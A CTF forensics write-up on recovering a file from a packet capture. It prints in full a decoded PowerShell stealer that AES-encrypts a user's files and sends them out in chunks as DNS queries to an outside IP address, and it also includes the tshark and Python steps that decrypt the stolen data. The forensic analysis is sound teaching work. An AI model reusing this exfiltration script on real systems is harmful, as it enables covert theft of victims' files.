---
layout: post
title:  "phished"
date:   2025-09-21 10:15:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /K17-2025-phished/
---

**Title:** phished

**Category:** easy +forensics

**Description:** We fired Billy last week after he failed a phishing test for the 6th time. We wiped his machine, but now we really need one of the files that was on it. Maybe he uploaded it somewhere? Do you think you can get it back from this packet capture?

I get this file:
```shell
file phished.pcapng  
phished.pcapng: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

After opening it in wireshark I find an obfuscated powershell script in an HTTP request. With the cyberchef recipe from base64, then decode text UTF-16LE (1200): [cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20%281200%29')&input=WmdCMUFHNEFZd0IwQUdrQWJ3QnVBQ0FBUXdCeUFHVUFZUUIwQUdVQUxRQkJBR1VBY3dCTkFHRUFiZ0JoQUdjQVpRQmtBRThBWWdCcUFHVUFZd0IwQUNnQUpBQnJBR1VBZVFBc0FDQUFKQUJKQUZZQUtRQWdBSHNBQ2dBa0FHRUFaUUJ6QUUwQVlRQnVBR0VBWndCbEFHUUFJQUE5QUNBQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBQ0lBVXdCNUFITUFkQUJsQUcwQUxnQlRBR1VBWXdCMUFISUFhUUIwQUhrQUxnQkRBSElBZVFCd0FIUUFid0JuQUhJQVlRQndBR2dBZVFBdUFFRUFaUUJ6QUUwQVlRQnVBR0VBWndCbEFHUUFJZ0FLQUNRQVlRQmxBSE1BVFFCaEFHNEFZUUJuQUdVQVpBQXVBRTBBYndCa0FHVUFJQUE5QUNBQVd3QlRBSGtBY3dCMEFHVUFiUUF1QUZNQVpRQmpBSFVBY2dCcEFIUUFlUUF1QUVNQWNnQjVBSEFBZEFCdkFHY0FjZ0JoQUhBQWFBQjVBQzRBUXdCcEFIQUFhQUJsQUhJQVRRQnZBR1FBWlFCZEFEb0FPZ0JEQUVJQVF3QUtBQ1FBWVFCbEFITUFUUUJoQUc0QVlRQm5BR1VBWkFBdUFGQUFZUUJrQUdRQWFRQnVBR2NBSUFBOUFDQUFXd0JUQUhrQWN3QjBBR1VBYlFBdUFGTUFaUUJqQUhVQWNnQnBBSFFBZVFBdUFFTUFjZ0I1QUhBQWRBQnZBR2NBY2dCaEFIQUFhQUI1QUM0QVVBQmhBR1FBWkFCcEFHNEFad0JOQUc4QVpBQmxBRjBBT2dBNkFGb0FaUUJ5QUc4QWN3QUtBQ1FBWVFCbEFITUFUUUJoQUc0QVlRQm5BR1VBWkFBdUFFSUFiQUJ2QUdNQWF3QlRBR2tBZWdCbEFDQUFQUUFnQURFQU1nQTRBQW9BSkFCaEFHVUFjd0JOQUdFQWJnQmhBR2NBWlFCa0FDNEFTd0JsQUhrQVV3QnBBSG9BWlFBZ0FEMEFJQUF5QURVQU5nQUtBR2tBWmdBZ0FDZ0FKQUJKQUZZQUtRQWdBSHNBQ2dCcEFHWUFJQUFvQUNRQVNRQldBQzRBWndCbEFIUUFWQUI1QUhBQVpRQW9BQ2tBTGdCT0FHRUFiUUJsQUNBQUxRQmxBSEVBSUFBaUFGTUFkQUJ5QUdrQWJnQm5BQ0lBS1FBZ0FIc0FDZ0FrQUdFQVpRQnpBRTBBWVFCdUFHRUFad0JsQUdRQUxnQkpBRllBSUFBOUFDQUFXd0JUQUhrQWN3QjBBR1VBYlFBdUFFTUFid0J1QUhZQVpRQnlBSFFBWFFBNkFEb0FSZ0J5QUc4QWJRQkNBR0VBY3dCbEFEWUFOQUJUQUhRQWNnQnBBRzRBWndBb0FDUUFTUUJXQUNrQUNnQjlBQW9BWlFCc0FITUFaUUFnQUhzQUNnQWtBR0VBWlFCekFFMEFZUUJ1QUdFQVp3QmxBR1FBTGdCSkFGWUFJQUE5QUNBQUpBQkpBRllBQ2dCOUFBb0FmUUFLQUdrQVpnQWdBQ2dBSkFCckFHVUFlUUFwQUNBQWV3QUtBR2tBWmdBZ0FDZ0FKQUJyQUdVQWVRQXVBR2NBWlFCMEFGUUFlUUJ3QUdVQUtBQXBBQzRBVGdCaEFHMEFaUUFnQUMwQVpRQnhBQ0FBSWdCVEFIUUFjZ0JwQUc0QVp3QWlBQ2tBSUFCN0FBb0FKQUJoQUdVQWN3Qk5BR0VBYmdCaEFHY0FaUUJrQUM0QVN3QmxBSGtBSUFBOUFDQUFXd0JUQUhrQWN3QjBBR1VBYlFBdUFFTUFid0J1QUhZQVpRQnlBSFFBWFFBNkFEb0FSZ0J5QUc4QWJRQkNBR0VBY3dCbEFEWUFOQUJUQUhRQWNnQnBBRzRBWndBb0FDUUFhd0JsQUhrQUtRQUtBSDBBQ2dCbEFHd0Fjd0JsQUNBQWV3QUtBQ1FBWVFCbEFITUFUUUJoQUc0QVlRQm5BR1VBWkFBdUFFc0FaUUI1QUNBQVBRQWdBQ1FBYXdCbEFIa0FDZ0I5QUFvQWZRQUtBQ1FBWVFCbEFITUFUUUJoQUc0QVlRQm5BR1VBWkFBS0FIMEFDZ0JtQUhVQWJnQmpBSFFBYVFCdkFHNEFJQUJGQUc0QVl3QnlBSGtBY0FCMEFDMEFRZ0I1QUhRQVpRQnpBQ2dBSkFCckFHVUFlUUFzQUNBQUpBQmlBSGtBZEFCbEFITUFLUUFnQUhzQUNnQWtBR0VBWlFCekFFMEFZUUJ1QUdFQVp3QmxBR1FBSUFBOUFDQUFRd0J5QUdVQVlRQjBBR1VBTFFCQkFHVUFjd0JOQUdFQWJnQmhBR2NBWlFCa0FFOEFZZ0JxQUdVQVl3QjBBQ0FBSkFCckFHVUFlUUFLQUNRQVpRQnVBR01BY2dCNUFIQUFkQUJ2QUhJQUlBQTlBQ0FBSkFCaEFHVUFjd0JOQUdFQWJnQmhBR2NBWlFCa0FDNEFRd0J5QUdVQVlRQjBBR1VBUlFCdUFHTUFjZ0I1QUhBQWRBQnZBSElBS0FBcEFBb0FKQUJsQUc0QVl3QnlBSGtBY0FCMEFHVUFaQUJFQUdFQWRBQmhBQ0FBUFFBZ0FDUUFaUUJ1QUdNQWNnQjVBSEFBZEFCdkFISUFMZ0JVQUhJQVlRQnVBSE1BWmdCdkFISUFiUUJHQUdrQWJnQmhBR3dBUWdCc0FHOEFZd0JyQUNnQUpBQmlBSGtBZEFCbEFITUFMQUFnQURBQUxBQWdBQ1FBWWdCNUFIUUFaUUJ6QUM0QVRBQmxBRzRBWndCMEFHZ0FLUUFLQUZzQVlnQjVBSFFBWlFCYkFGMEFYUUFnQUNRQVpnQjFBR3dBYkFCRUFHRUFkQUJoQUNBQVBRQWdBQ1FBWVFCbEFITUFUUUJoQUc0QVlRQm5BR1VBWkFBdUFFa0FWZ0FnQUNzQUlBQWtBR1VBYmdCakFISUFlUUJ3QUhRQVpRQmtBRVFBWVFCMEFHRUFDZ0FrQUdFQVpRQnpBRTBBWVFCdUFHRUFad0JsQUdRQUxnQkVBR2tBY3dCd0FHOEFjd0JsQUNnQUtRQUtBRnNBVXdCNUFITUFkQUJsQUcwQUxnQkRBRzhBYmdCMkFHVUFjZ0IwQUYwQU9nQTZBRlFBYndCQ0FHRUFjd0JsQURZQU5BQlRBSFFBY2dCcEFHNEFad0FvQUNRQVpnQjFBR3dBYkFCRUFHRUFkQUJoQUNrQUNnQjlBQW9BSkFCckFDQUFQUUFnQUNJQU1nQjZBR1FBV1FCQ0FFNEFWUUI1QURFQWR3QkNBRWdBVFFCYUFFa0Fid0EzQUc0QU5nQkxBSFVBY1FCUEFEZ0FWZ0IyQURnQVlnQnBBRllBWndCMkFHb0FlQUJ4QUVRQUx3QXJBRVFBVXdCdUFHZ0FVUUE5QUNJQUNnQWtBR1FBSUFBOUFDQUFJZ0F6QURRQUxnQXpBREFBTGdBMEFEQUFMZ0F4QURFQU5BQWlBQW9BSkFCekFDQUFQUUFnQURRQUNnQWtBR0lBSUFBOUFDQUFOUUEzQUFvQVJ3QmxBSFFBTFFCREFHZ0FhUUJzQUdRQVNRQjBBR1VBYlFBZ0FDSUFmZ0F2QUVZQWFRQnNBR1VBY3dBaUFDQUFmQUFnQUVZQWJ3QnlBR1VBWVFCakFHZ0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FIc0FDZ0FrQUdFQUlBQTlBQ0FBSkFCZkFDNEFUZ0JoQUcwQVpRQUtBQ1FBZWdBZ0FEMEFJQUJiQUZNQWVRQnpBSFFBWlFCdEFDNEFTUUJQQUM0QVJnQnBBR3dBWlFCZEFEb0FPZ0JTQUdVQVlRQmtBRUVBYkFCc0FFSUFlUUIwQUdVQWN3QW9BQ1FBWHdBdUFFWUFkUUJzQUd3QVRnQmhBRzBBWlFBcEFBb0FKQUJsQUNBQVBRQWdBRVVBYmdCakFISUFlUUJ3QUhRQUxRQkNBSGtBZEFCbEFITUFJQUFrQUdzQUlBQWtBSG9BQ2dBa0FHd0FJQUE5QUNBQUpBQmxBQzRBVEFCbEFHNEFad0IwQUdnQUNnQWtBSElBSUFBOUFDQUFJZ0FpQUFvQUpBQnVBQ0FBUFFBZ0FEQUFDZ0IzQUdnQWFRQnNBR1VBSUFBb0FDUUFiZ0FnQUMwQWJBQmxBQ0FBS0FBa0FHd0FJQUF2QUNBQUpBQmlBQ2tBS1FBZ0FIc0FDZ0FrQUdNQUlBQTlBQ0FBSkFCaUFBb0FhUUJtQUNBQUtBQW9BQ1FBYmdBZ0FDb0FJQUFrQUdJQUtRQWdBQ3NBSUFBa0FHTUFJQUF0QUdjQWRBQWdBQ1FBYkFBcEFDQUFld0FLQUNRQVl3QWdBRDBBSUFBa0FHd0FJQUF0QUNBQUtBQWtBRzRBSUFBcUFDQUFKQUJpQUNrQUNnQjlBQW9BSkFCeUFDQUFLd0E5QUNBQUpBQmxBQzRBVXdCMUFHSUFjd0IwQUhJQWFRQnVBR2NBS0FBa0FHNEFJQUFxQUNBQUpBQmlBQ3dBSUFBa0FHTUFLUUFnQUNzQUlBQWlBQzBBTGdBaUFBb0FhUUJtQUNBQUtBQW9BQ1FBYmdBZ0FDVUFJQUFrQUhNQUtRQWdBQzBBWlFCeEFDQUFLQUFrQUhNQUlBQXRBQ0FBTVFBcEFDa0FJQUI3QUFvQWJnQnpBR3dBYndCdkFHc0FkUUJ3QUNBQUxRQjBBSGtBY0FCbEFEMEFRUUFnQUNRQWNnQWtBR0VBTGdBZ0FDUUFaQUE3QUNBQUpBQnlBQ0FBUFFBZ0FDSUFJZ0FLQUZNQWRBQmhBSElBZEFBdEFGTUFiQUJsQUdVQWNBQWdBQzBBVFFCcEFHd0FiQUJwQUhNQVpRQmpBRzhBYmdCa0FITUFJQUF4QURVQU53QUtBSDBBQ2dBa0FHNEFJQUE5QUNBQUpBQnVBQ0FBS3dBZ0FERUFDZ0I5QUFvQWJnQnpBR3dBYndCdkFHc0FkUUJ3QUNBQUxRQjBBSGtBY0FCbEFEMEFRUUFnQUNRQWNnQWtBR0VBTGdBZ0FDUUFaQUFLQUgwQQ&oenc=65001) I can see the plaintext:
```powershell
function Create-AesManagedObject($key, $IV) {
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
if ($IV) {
if ($IV.getType().Name -eq "String") {
$aesManaged.IV = [System.Convert]::FromBase64String($IV)
}
else {
$aesManaged.IV = $IV
}
}
if ($key) {
if ($key.getType().Name -eq "String") {
$aesManaged.Key = [System.Convert]::FromBase64String($key)
}
else {
$aesManaged.Key = $key
}
}
$aesManaged
}
function Encrypt-Bytes($key, $bytes) {
$aesManaged = Create-AesManagedObject $key
$encryptor = $aesManaged.CreateEncryptor()
$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[byte[]] $fullData = $aesManaged.IV + $encryptedData
$aesManaged.Dispose()
[System.Convert]::ToBase64String($fullData)
}
$k = "2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ="
$d = "34.30.40.114"
$s = 4
$b = 57
Get-ChildItem "~/Files" | Foreach-Object {
$a = $_.Name
$z = [System.IO.File]::ReadAllBytes($_.FullName)
$e = Encrypt-Bytes $k $z
$l = $e.Length
$r = ""
$n = 0
while ($n -le ($l / $b)) {
$c = $b
if (($n * $b) + $c -gt $l) {
$c = $l - ($n * $b)
}
$r += $e.Substring($n * $b, $c) + "-."
if (($n % $s) -eq ($s - 1)) {
nslookup -type=A $r$a. $d; $r = ""
Start-Sleep -Milliseconds 157
}
$n = $n + 1
}
nslookup -type=A $r$a. $d
}
```
This script exfiltrates files via DNS and encrypts each chunk of data (57 base64 encoded chars) with AES. The key is `2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ=` and `IV` is the first 16 bytes of the data. 

I find 2 files exfiltrated. `transactions.xlsx` and `flag.docx`. 

I get the data by running this tshark command: `tshark -r phished.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name | uniq`. I copy and paste just the `flag.docx` data into cyberchef and process the data there. 

Run the recipe find/replace `114.40.30.34.in-addr.arpa` with nothing, find/replace `-.` with nothing, find/replace `flag.docx` with nothing, and remove whitespace: [cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'114.40.30.34.in-addr.arpa'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'-%5C%5C.'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'flag.docx'%7D,'',true,false,true,false)Remove_whitespace(true,true,true,true,true,false)&input=). 

Run this script to decrypt the data and open the `.docx` file to get the flag: 
```python
from base64 import b64decode
from Crypto.Cipher import AES

key_b64 = "2zdYBNUy1wBHMZIo7n6KuqO8Vv8biVgvjxqD/+DSnhQ="
key = b64decode(key_b64)

b64_data = "YEI27cl3KgUeOLbrhKD4Vz4MR+juUOID1UTF56mkrOrhmR+fwwm3yAXqZPECMLmwUXtnwVt1H+sCWhcCVnz1pXEd9Knq2qvK/BreATBgBKrrGi/dXTiIMvaPYZ/LXi1DkjRQKpuJLDWRa+AGFb+q34m9SObglsb96NZlWnL+dfa+oyq/2nSUDp46KPme1MJkEHtORr0K8I97X0qcurXTvP6i32zG+rWpVF5n+R9aZg2uy1F7tyC6m4kaKlyBNrD3peHSRNnltZUU9HB67NB3e94PoK+lE5rmwm1wal2Itc/qL73Dp2eCBPusu/FdY0do6UQCtSFDYnj7Fur2l0OU6fwdJ/iFmJ9MFCikg4RPf+m2fRsOEPcCz+CDxY4eOMgI..."

data = b64decode(b64_data)
iv = data[:16]
ciphertext = data[16:]

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

plaintext = plaintext.rstrip(b"\x00")

with open("flag.docx", "wb") as f:
    f.write(plaintext)
```

`K17{inf0_stealer?n@h_1t's_a_fr33_backup!}`

